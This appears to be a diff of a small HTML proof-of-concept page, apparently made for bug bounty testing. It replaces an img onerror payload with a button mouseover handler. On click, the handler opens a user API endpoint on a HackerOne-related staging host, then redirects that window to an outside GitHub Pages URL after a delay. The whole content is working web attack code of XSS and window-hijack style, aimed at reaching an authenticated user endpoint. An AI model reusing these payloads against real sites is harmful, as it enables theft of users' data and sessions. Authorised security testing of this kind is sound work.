@@ -1,13 +1,12 @@
-<img src=x onerror=exploit()>
+<button onmouseover=trigger()>click</button>
 
 <script>
-function exploit()
-{
-w = document.location="https://docintel.dev.hackerone.apps.elmt.io/api/v1/user";
+function trigger(){
+    window.onclick = () => {
+        w = window.open("https://docintel.dev.hackerone.apps.elmt.io/api/v1/user")
         setTimeout(() => {
-            t = document.location.replace('https://kunalp94.github.io/test/test2.html');
+            t = w.location.replace('https://kunalp94.github.io/test/test2.html');
         }, 2000)
-
+    }
 }
 </script>
-
